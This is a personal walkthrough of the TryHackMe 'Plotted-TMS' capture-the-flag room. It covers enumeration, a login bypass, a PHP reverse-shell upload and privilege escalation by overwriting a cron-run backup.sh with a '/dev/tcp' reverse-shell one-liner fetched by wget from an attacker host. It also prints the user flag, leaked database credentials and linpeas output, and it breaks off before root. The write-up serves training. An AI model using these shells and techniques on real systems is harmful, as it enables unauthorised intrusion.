<h1 align="center">Plotted-TMS</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/7cb2d5fb-6bd8-4d1d-9562-83ad9ae19e2e"><br>
July 6, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>426</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Everything here is plotted</em>!<br>
Access it <a href="https://tryhackme.com/room/plottedtms"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/cb0bcf61-2cf0-48c3-bf9a-1b069faedf41"></p>

<br>

<h2>Task 1 . Compromise</h2>
<p>Happy Hunting!<br>

Tip: Enumeration is key!</p>

<p><em>Answer the questions below</em></p>

<br>

<h3>nmap</h3>

```bash
:~/Plotted-TMS# nmap -sS -sS -p -Pn -T4 TargetIP
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  microsoft-ds
...
Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

<h3>dirb</h3>

```bash
:~/Plotted-TMS# dirb http://TargetP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
...
GENERATED WORDS: 4612                                                          

---- Scanning URL: http://TargetIP/ ----
==> DIRECTORY: http://TargetIP/admin/                                                                                                      
+ http:/TargetIP/index.html (CODE:200|SIZE:10918)                                                                                         
+ http://TargetIP/passwd (CODE:200|SIZE:25)                                                                                                
+ http://TargetIP/server-status (CODE:403|SIZE:277)                                                                                        
+ http:/TargetIP/shadow (CODE:200|SIZE:25)                                                                                                
                                                                                                                                               
---- Entering directory: http://TargetIP/admin/ ----
...
+ http://TargetIP/admin/id_rsa (CODE:200|SIZE:81) 
Task Completed
```

```bash
:~/Plotted-TMS# dirb http:/TargetIP:445 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
...
GENERATED WORDS: 4612                                                          

---- Scanning URL: http://TargetIP:445/ ----
+ http:/TargetIP:445/index.html (CODE:200|SIZE:10918)                                                                                             
==> DIRECTORY: http://TargetIP:445/management/                                                                                                     
+ http://TargetIP:445/server-status (CODE:403|SIZE:278)                                                                                            
                                                                                                                                                       
---- Entering directory: http://TargetIP:445/management/ ----
==> DIRECTORY: http://TargetIP:445/management/admin/                                                                                               
==> DIRECTORY: http://TargetIP:445/management/assets/                                                                                              
==> DIRECTORY: http://TargetIP:445/management/build/                                                                                               
==> DIRECTORY: http://TargetIP:445/management/classes/                                                                                             
==> DIRECTORY: http://TargetIP:445/management/database/                                                                                            
==> DIRECTORY: http://10.10.96.120:445/management/dist/                                                                                                
==> DIRECTORY: http://10.10.96.120:445/management/inc/                                                                                                 
+ http://10.10.96.120:445/management/index.php (CODE:200|SIZE:14506)                                                                                   
==> DIRECTORY: http://10.10.96.120:445/management/libs/                                                                                                
==> DIRECTORY: http://10.10.96.120:445/management/pages/                                                                                               
==> DIRECTORY: http://10.10.96.120:445/management/plugins/                                                                                             
==> DIRECTORY: http://10.10.96.120:445/management/uploads/                                                                                             
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/admin/ ----
==> DIRECTORY: http://10.10.96.120:445/management/admin/drivers/                                                                                       
==> DIRECTORY: http://10.10.96.120:445/management/admin/inc/                                                                                           
+ http://10.10.96.120:445/management/admin/index.php (CODE:200|SIZE:22279)                                                                             
==> DIRECTORY: http://10.10.96.120:445/management/admin/maintenance/                                                                                   
==> DIRECTORY: http://10.10.96.120:445/management/admin/reports/                                                                                       
==> DIRECTORY: http://10.10.96.120:445/management/admin/user/                                                                                          
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/assets/css/                                                                                          
==> DIRECTORY: http://10.10.96.120:445/management/assets/js/                                                                                           
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/build/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/build/config/                                                                                        
==> DIRECTORY: http://10.10.96.120:445/management/build/js/                                                                                            
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/classes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/database/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/dist/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/dist/css/                                                                                            
==> DIRECTORY: http://10.10.96.120:445/management/dist/img/                                                                                            
==> DIRECTORY: http://10.10.96.120:445/management/dist/js/                                                                                             
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/inc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/libs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/libs/css/                                                                                            
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/pages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/plugins/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/plugins/jquery/                                                                                      
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/uploads/drivers/                                                                                     
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/admin/drivers/ ----
+ http://10.10.96.120:445/management/admin/drivers/index.php (CODE:500|SIZE:0)                                                                         
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/admin/inc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/admin/maintenance/ ----
+ http://10.10.96.120:445/management/admin/maintenance/index.php (CODE:500|SIZE:0)                                                                     
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/admin/reports/ ----
+ http://10.10.96.120:445/management/admin/reports/index.php (CODE:500|SIZE:0)                                                                         
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/admin/user/ ----
+ http://10.10.96.120:445/management/admin/user/index.php (CODE:500|SIZE:0)                                                                            
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/assets/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/assets/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/build/config/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/build/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/dist/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/dist/css/alt/                                                                                        
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/dist/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/dist/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
==> DIRECTORY: http://10.10.96.120:445/management/dist/js/pages/                                                                                       
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/libs/css/ ----
+ http://10.10.96.120:445/management/libs/css/index.php (CODE:200|SIZE:0)                                                                              
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/plugins/jquery/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/uploads/drivers/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/dist/css/alt/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
---- Entering directory: http://10.10.96.120:445/management/dist/js/pages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                       
```

<h3>TargetIP/passwd</h3>

```bash
bm90IHRoaXMgZWFzeSA6RA==
```

<p>=</p>

```bash
not this easy :D
```

![image](https://github.com/user-attachments/assets/45c89e5e-1df2-41cc-a729-07888365a8e4)


<h3>TargetIP/shadow</h3>

```bash
bm90IHRoaXMgZWFzeSA6RA==
```

<p>=</p>

```bash
not this easy :D
```

![image](https://github.com/user-attachments/assets/e2bc9879-bd97-4a8d-a226-698c41182a88)


<h3>TargetIP/admin/id_rsa</h3>

```bash
VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
```

![image](https://github.com/user-attachments/assets/2eac86d4-50e2-49b6-b153-1089e0584b63)

<h3>CyberChef</h3>
<p>Trust me it is not this easy..now get back to enumeration :D</p>

![image](https://github.com/user-attachments/assets/4c335d7c-c125-4bd4-a8e7-c9cc002a79b9)

<h3>TargetIP:445/management</h3>
<p>

- Login<br>
- Tommy Lasorda<br>
- CopyrightTOMS 2021<br>
- Developed By: oretnom23<br>
- oretnom23@gmail.com<br>
- /management/dist/js/script.js<br>
- /management/assets/js/scripts.js<br>
- background-image:url(/management/uploads/1629334140_traffic_bg.jpg);<br>
- Login: /management/admin</p>

![image](https://github.com/user-attachments/assets/bd821694-b3ae-49fb-bc52-c911681ef7a1)


<h3>OWASP ZAP</h3>

```bash
:~/Plotted-TMS# sudo snap install zaproxy --classic
...
:~/Plotted-TMS# xaproxy
```

![image](https://github.com/user-attachments/assets/07289bd8-a76b-452d-8cfd-1b3c97610566)

<br>

<p>

- clicked <code>Automated Scan</code><br>
- URL to attack: http://<code>TargetIP>/code>
</p>

![image](https://github.com/user-attachments/assets/f7d7774a-0a00-4cab-b72c-f6142af38cc4)

![image](https://github.com/user-attachments/assets/aa079c62-6203-44b7-9b9c-440b682c4fcb)

<p>- URL to attack: http://<code>TargetIP:445</code>p>
  
![image](https://github.com/user-attachments/assets/1d94c05e-ac7c-41e0-9d67-0e940e6eb06f)

![image](https://github.com/user-attachments/assets/9d6a8fc9-1a1a-455e-a158-ac73f03c74a7)

<br>

<h3>SQL Injection</h3>

![image](https://github.com/user-attachments/assets/45417d28-827f-42f8-9f64-4784cdbd08bd)

<h3>http://TargetIP:445/management/admin/login.php</h3>

![image](https://github.com/user-attachments/assets/92eb1c7c-3f0a-40fe-8a8d-d4ad569e1bee)

![image](https://github.com/user-attachments/assets/2e8e8086-cb42-458a-b510-4cfa8764d64d)

![image](https://github.com/user-attachments/assets/7053be1b-60ed-41be-a300-67c99807adb5)


<h3>Reverse shell</h3>
<p>php</p>

![image](https://github.com/user-attachments/assets/de4576c4-780b-427f-b9cb-1fe41e918bd3)


<h3>listener</h3>

```bash
:~/Plotted-TMS# nc -nlvp 4444
```

<h3>Loaded <code>rev.php</code></h3>

![image](https://github.com/user-attachments/assets/84ff886f-d653-4257-ac5d-3134fd663e95)

<h3>Shell</h3>

```bash
:~/Plotted-TMS# nc -nlvp 4444
...
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@plotted:/$ ^Z
[1]+  Stopped                 nc -nlvp 4444
:~/Plotted-TMS# stty raw -echo; fg
nc -nlvp 4444

www-data@plotted:/$ 
```

<h3>/scripts</h3>

```bash
www-data@plotted:/var/www/scripts$ ls -lah
total 12K
drwxr-xr-x 2 www-data   www-data   4.0K Oct 28  2021 .
drwxr-xr-x 4 root       root       4.0K Oct 28  2021 ..
-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh
www-data@plotted:/var/www/scripts$ cat backup.sh
#!/bin/bash

/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
/bin/chmod -R 770 /home/plot_admin/tms_backup/management
```

```bash
www-data@plotted:/var/www/scripts$ rm backup.sh
rm: remove write-protected regular file 'backup.sh'? y
www-data@plotted:/var/www/scripts$ touch backup.sh
```

```bash
~/Plotted-TMS# cat backup.sh
#!/bin/bash
/bin/sh -i >& /dev/tcp/AttackIP/6666 0>&1
```

```bash
www-data@plotted:/var/www/scripts$ wget http://AttackIP:8000/backup.sh
wget http://AttackIP:8000/backup.sh
...
backup.sh           100%[===================>]      58  --.-KB/s    in 0.006s  
www-data@plotted:/var/www/scripts$ chmod +x backup.sh
chmod +x backup.sh
```

```bash
:~/Plotted-TMS# nc -nlvp 6666
...
$ whoami
plot_admin
$ which python3
/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
plot_admin@plotted:~$ ^Z
[1]+  Stopped                 nc -nlvp 6666
:~/Plotted-TMS# stty raw -echo; fg
nc -nlvp 6666
```

<br>

<p>1.1. What is user.txt?<br>
<code>77927510d5edacea1f9e86602f1fbadb</code></p>


```bash
plot_admin@plotted:~$$ cd /home
plot_admin@plotted:~$ ls
plot_admin
ubuntu
plot_admin@plotted:~$ cd plot_admin
plot_admin@plotted:~$ ls
tms_backup
user.txt
plot_admin@plotted:~$ cat user.txt
77927510d5edacea1f9e86602f1fbadb
```

<br>
<br>

```bash
plot_admin@plotted:~$ ls -la
total 32
drwxr-xr-x  4 plot_admin plot_admin 4096 Oct 28  2021 .
drwxr-xr-x  4 root       root       4096 Oct 28  2021 ..
lrwxrwxrwx  1 root       root          9 Oct 28  2021 .bash_history -> /dev/null
-rw-r--r--  1 plot_admin plot_admin  220 Oct 28  2021 .bash_logout
-rw-r--r--  1 plot_admin plot_admin 3771 Oct 28  2021 .bashrc
drwxrwxr-x  3 plot_admin plot_admin 4096 Oct 28  2021 .local
-rw-r--r--  1 plot_admin plot_admin  807 Oct 28  2021 .profile
drwxrwx--- 14 plot_admin plot_admin 4096 Oct 28  2021 tms_backup
-rw-rw----  1 plot_admin plot_admin   33 Oct 28  2021 user.txt
plot_admin@plotted:~$ cd tms_backup
plot_admin@plotted:~/tms_backup$ ls
404.html    assets   config.php  home.php   initialize.php  pages
about.html  build    database    inc        libs            plugins
admin       classes  dist        index.php  management      uploads
plot_admin@plotted:~/tms_backup$ cat config.php
<?php
ob_start();
ini_set('date.timezone','Asia/Manila');
date_default_timezone_set('Asia/Manila');
session_start();

require_once('initialize.php');
require_once('classes/DBConnection.php');
require_once('classes/SystemSettings.php');
$db = new DBConnection;
$conn = $db->conn;

function redirect($url=''){
	if(!empty($url))
	echo '<script>location.href="'.base_url .$url.'"</script>';
}
function validate_image($file){
	if(!empty($file)){
			// exit;
		if(is_file(base_app.$file)){
			return base_url.$file;
		}else{
			return base_url.'dist/img/no-image-available.png';
		}
	}else{
		return base_url.'dist/img/no-image-available.png';
	}
}
function isMobileDevice(){
    $aMobileUA = array(
        '/iphone/i' => 'iPhone', 
        '/ipod/i' => 'iPod', 
        '/ipad/i' => 'iPad', 
        '/android/i' => 'Android', 
        '/blackberry/i' => 'BlackBerry', 
        '/webos/i' => 'Mobile'
    );

    //Return true if Mobile User Agent is detected
    foreach($aMobileUA as $sMobileKey => $sMobileOS){
        if(preg_match($sMobileKey, $_SERVER['HTTP_USER_AGENT'])){
            return true;
        }
    }
    //Otherwise return false..  
    return false;
}
ob_end_flush();
```

```bash
plot_admin@plotted:~/tms_backup/database$ ls
traffic_offense_db.sql
```

```bash
plot_admin@plotted:/var/www/html/445/management$ ls -la
total 80
drwxr-xr-x 13 www-data www-data 4096 Oct 28  2021 .
drwxr-xr-x  3 www-data www-data 4096 Oct 28  2021 ..
-rw-r--r--  1 www-data www-data  198 Oct 28  2021 404.html
-rw-r--r--  1 www-data www-data 1836 Oct 28  2021 about.html
drwxr-xr-x  9 www-data www-data 4096 Oct 28  2021 admin
drwxr-xr-x  4 www-data www-data 4096 Oct 28  2021 assets
drwxr-xr-x  6 www-data www-data 4096 Oct 28  2021 build
drwxr-xr-x  2 www-data www-data 4096 Oct 28  2021 classes
-rw-r--r--  1 www-data www-data 1236 Oct 28  2021 config.php
drwxr-xr-x  2 www-data www-data 4096 Oct 28  2021 database
drwxr-xr-x  5 www-data www-data 4096 Oct 28  2021 dist
-rw-r--r--  1 www-data www-data  747 Oct 28  2021 home.php
-rw-r--r--  1 www-data www-data  225 Oct 28  2021 .htaccess
drwxr-xr-x  2 www-data www-data 4096 Oct 28  2021 inc
-rw-r--r--  1 www-data www-data 2590 Oct 28  2021 index.php
-rw-r--r--  1 www-data www-data  651 Oct 28  2021 initialize.php
drwxr-xr-x  4 www-data www-data 4096 Oct 28  2021 libs
drwxr-xr-x  2 www-data www-data 4096 Oct 28  2021 pages
drwxr-xr-x 61 www-data www-data 4096 Oct 28  2021 plugins
drwxr-xr-x  3 www-data www-data 4096 Jul  6 19:36 uploads
```

<h3>tms_user:Password@123</h3>

```bash
plot_admin@plotted:/var/www/html/445/management$ cat initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','/management/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"tms_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"Password@123");
if(!defined('DB_NAME')) define('DB_NAME',"tms_db");
?>
```

```bash
:~/Plotted-TMS# sudo apt install default-mysql-client
....
```

<h3>linpeas.sh</h3>

![image](https://github.com/user-attachments/assets/2ac1b589-9c55-459e-8a0e-e2c566fa7d72)


<h3>/etc/doas.conf --> permit nopass plot_admin as root cmd openssl</h3>

```bash
===================================( Network Information )====================================
[+] Hostname, hosts and DNS
plotted
127.0.0.1 localhost
127.0.1.1 plotted

...

====================================( Users Information )=====================================
[+] My user
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)

[+] Do I have PGP keys?

[+] Clipboard or highlighted text?
xsel and xclip Not Found

[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
Sorry, try again.

[+] Checking /etc/doas.conf
permit nopass plot_admin as root cmd openssl

...

[+] Superusers
root:x:0:0:root:/root:/bin/bash

[+] Users with console
plot_admin:x:1001:1001:,,,:/home/plot_admin:/bin/bash
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
...

===================================( Software Information )===================================
[+] MySQL version
mysql  Ver 8.0.27-0ubuntu0.20.04.1 for Linux on x86_64 ((Ubuntu))

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No
[+] MySQL connection using root/NOPASS ................. No
[+] Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found

[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No

...
[+] Searching Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

...

[+] Searching ldap directories and their hashes
/etc/ldap
The password hash is from the {SSHA} to 'structural'

...
[+] Searching ssl/ssh files
/var/www/html/80/admin/id_rsa /etc/apache2/sites-enabled
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
  --> Some certificates were found (out limited):
/var/lib/fwupd/pki/client.pem
/etc/pki/fwupd/LVFS-CA.pem
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem

...

[+] Searching neo4j auth file

[+] Searching Cloud-Init conf file
Found readable /etc/cloud/cloud.cfg
     lock_passwd: True
     groups: [adm, audio, cdrom, dialout, dip, floppy, lxd, netdev, plugdev, sudo, video]
     sudo: ["ALL=(ALL) NOPASSWD:ALL"]

...
====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/snap/core18/2284/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core18/2284/bin/ping
/snap/core18/2284/bin/su
/snap/core18/2284/bin/umount		--->	BSD/Linux(08-1996)
/snap/core18/2284/usr/bin/chfn		--->	SuSE_9.3/10
/snap/core18/2284/usr/bin/chsh
/snap/core18/2284/usr/bin/gpasswd
/snap/core18/2284/usr/bin/newgrp		--->	HP-UX_10.20
/snap/core18/2284/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core18/2284/usr/bin/sudo		--->	/sudo$
/snap/core18/2284/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2284/usr/lib/openssh/ssh-keysign
/snap/core18/2246/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core18/2246/bin/ping
/snap/core18/2246/bin/su
/snap/core18/2246/bin/umount		--->	BSD/Linux(08-1996)
/snap/core18/2246/usr/bin/chfn		--->	SuSE_9.3/10
/snap/core18/2246/usr/bin/chsh
/snap/core18/2246/usr/bin/gpasswd
/snap/core18/2246/usr/bin/newgrp		--->	HP-UX_10.20
/snap/core18/2246/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core18/2246/usr/bin/sudo		--->	/sudo$
/snap/core18/2246/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2246/usr/lib/openssh/ssh-keysign
/snap/core20/1328/usr/bin/chfn		--->	SuSE_9.3/10
/snap/core20/1328/usr/bin/chsh
/snap/core20/1328/usr/bin/gpasswd
/snap/core20/1328/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core20/1328/usr/bin/newgrp		--->	HP-UX_10.20
/snap/core20/1328/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core20/1328/usr/bin/su
/snap/core20/1328/usr/bin/sudo		--->	/sudo$
/snap/core20/1328/usr/bin/umount		--->	BSD/Linux(08-1996)
/snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1328/usr/lib/openssh/ssh-keysign
/snap/core20/1169/usr/bin/chfn		--->	SuSE_9.3/10
/snap/core20/1169/usr/bin/chsh
/snap/core20/1169/usr/bin/gpasswd
/snap/core20/1169/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core20/1169/usr/bin/newgrp		--->	HP-UX_10.20
/snap/core20/1169/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core20/1169/usr/bin/su
/snap/core20/1169/usr/bin/sudo		--->	/sudo$
/snap/core20/1169/usr/bin/umount		--->	BSD/Linux(08-1996)
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1169/usr/lib/openssh/ssh-keysign
/snap/snapd/14549/usr/lib/snapd/snap-confine
/snap/snapd/13640/usr/lib/snapd/snap-confine
/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/usr/bin/sudo		--->	/sudo$
/usr/bin/gpasswd
/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/usr/bin/su
/usr/bin/chfn		--->	SuSE_9.3/10
/usr/bin/fusermount
/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
/usr/bin/chsh
/usr/bin/umount		--->	BSD/Linux(08-1996)
/usr/bin/doas
/usr/bin/newgrp		--->	HP-UX_10.20
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/snap/core18/2284/sbin/pam_extrausers_chkpwd
/snap/core18/2284/sbin/unix_chkpwd
/snap/core18/2284/usr/bin/chage
/snap/core18/2284/usr/bin/expiry

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/snap/core18/2284/sbin/pam_extrausers_chkpwd
/snap/core18/2284/sbin/unix_chkpwd
/snap/core18/2284/usr/bin/chage
/snap/core18/2284/usr/bin/expiry
/snap/core18/2284/usr/bin/ssh-agent
/snap/core18/2284/usr/bin/wall
/snap/core18/2246/sbin/pam_extrausers_chkpwd
/snap/core18/2246/sbin/unix_chkpwd
/snap/core18/2246/usr/bin/chage
/snap/core18/2246/usr/bin/expiry
/snap/core18/2246/usr/bin/ssh-agent
/snap/core18/2246/usr/bin/wall
/snap/core20/1328/usr/bin/chage
/snap/core20/1328/usr/bin/expiry
/snap/core20/1328/usr/bin/ssh-agent
/snap/core20/1328/usr/bin/wall
/snap/core20/1328/usr/sbin/pam_extrausers_chkpwd
/snap/core20/1328/usr/sbin/unix_chkpwd
/snap/core20/1169/usr/bin/chage
/snap/core20/1169/usr/bin/expiry
/snap/core20/1169/usr/bin/ssh-agent
/snap/core20/1169/usr/bin/wall
/snap/core20/1169/usr/sbin/pam_extrausers_chkpwd
/snap/core20/1169/usr/sbin/unix_chkpwd
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/ssh-agent
/usr/bin/chage
/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
/usr/bin/crontab
/usr/bin/wall
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd

[+] Writable folders configured in /etc/ld.so.conf.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d
/usr/local/lib
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/snap/core20/1328/usr/bin/ping = cap_net_raw+ep
/snap/core20/1169/usr/bin/ping = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

[+] Users with capabilities

...

[+] .sh files in path
/usr/bin/gettext.sh
/usr/bin/rescan-scsi-bus.sh

[+] Unexpected folders in root
/cdrom

[+] Files (scripts) in /etc/profile.d/
total 44
drwxr-xr-x   2 root root 4096 Aug 24  2021 .
drwxr-xr-x 101 root root 4096 Jul  6 18:23 ..
